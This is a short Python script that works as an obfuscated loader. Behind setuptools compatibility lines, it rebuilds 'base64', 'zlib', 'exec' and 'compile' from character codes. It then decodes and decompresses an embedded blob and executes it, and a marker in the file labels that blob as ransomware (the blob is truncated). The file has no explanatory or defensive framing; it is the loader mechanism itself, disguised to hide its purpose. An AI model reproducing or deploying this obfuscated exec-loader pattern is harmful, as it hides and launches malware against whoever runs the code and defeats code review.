import sys, os
try:
    import _distutils_hack
    if not hasattr(_distutils_hack, 'add_shim'): _distutils_hack.add_shim = lambda: None
except: pass
os.environ['SETUPTOOLS_USE_DISTUTILS'] = 'stdlib'
v_87e7f6bc = __import__(str().join([chr(98),chr(117),chr(105),chr(108),chr(116),chr(105),chr(110),chr(115)]))
v_3c7aea46 = __import__(str().join([chr(98),chr(97),chr(115),chr(101),chr(54),chr(52)]))
v_e70f8f76 = __import__(str().join([chr(122),chr(108),chr(105),chr(98)]))
v_b1db612b = 'eNrs/eeS40i6IAr+r6eIqWvHMvOyOgktaqbHDBQACE0AhGCf3jRIQgOEIETfNtuH2CfcJ1knIyIrUlR3…[zlib+b64 ransomware truncated]'
v_99c29a42 = getattr(v_3c7aea46, str().join([chr(98),chr(54),chr(52),chr(100),chr(101),chr(99),chr(111),chr(100),chr(101)]))(v_b1db612b)
v_65f45ea2 = getattr(v_e70f8f76, str().join([chr(100),chr(101),chr(99),chr(111),chr(109),chr(112),chr(114),chr(101),chr(115),chr(115)]))(v_99c29a42)
v_2d343563 = getattr(v_87e7f6bc, str().join([chr(101),chr(120),chr(101),chr(99)]))
v_0d1818d0 = getattr(v_87e7f6bc, str().join([chr(99),chr(111),chr(109),chr(112),chr(105),chr(108),chr(101)]))
globals()['__file__'] = os.path.abspath(sys.argv[0])
os.environ['CRPX0_LOADER'] = '1'
v_2d343563(v_0d1818d0(v_65f45ea2, globals()['__file__'], str().join([chr(101),chr(120),chr(101),chr(99)])), globals())
